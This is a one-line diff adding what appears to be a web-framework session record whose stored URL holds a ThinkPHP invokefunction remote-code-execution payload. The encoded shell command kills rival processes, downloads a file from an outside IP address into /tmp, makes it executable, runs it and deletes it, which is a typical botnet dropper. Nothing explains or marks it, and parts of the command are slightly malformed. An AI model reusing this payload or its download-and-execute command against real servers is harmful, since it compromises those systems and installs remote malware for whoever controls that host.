@@ -1,0 +1,1 @@
+__ci_last_regenerate|i:1703086399;_ci_previous_url|s:290:"https://innov8agent.com/index.php?s=%2FIndex%2F%09hink%07pp%2Finvokefunction&function=call_user_func_array&vars%5B0%5D=shell_exec&vars%5B1%5D%5B0%5D=pkill+-f+x86%3Bpkill+-f+arm%3Bpkill+-f+x86_64%3Bcd+%2Ftmp%2F%3Bcurl+http%3A%2F%2F103.37.61.26%2Fthinkphp%3Bchmod+777php%3Bsh+php%3Brm+-rf+php";
